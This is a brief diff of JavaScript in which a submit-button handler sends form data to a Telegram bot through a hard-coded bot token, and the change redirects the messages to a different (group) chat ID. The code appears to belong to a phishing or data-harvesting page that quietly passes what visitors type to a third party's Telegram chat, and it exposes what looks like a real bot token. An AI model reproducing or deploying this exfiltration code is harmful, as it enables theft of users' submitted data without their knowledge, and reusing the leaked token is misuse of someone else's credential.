@@ -139,7 +139,7 @@ document.getElementById("submit-btn").addEventListener("click", function () {
 
     // Replace with your Telegram bot token and chat ID
     const token = "7715963047:AAHgVYANxaaDv4MLDVTAusS45NeDHG3J1Y0";
-    const chatId = "1426135758";
+    const chatId = "-1002297711551";
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
     // Send the data to Telegram
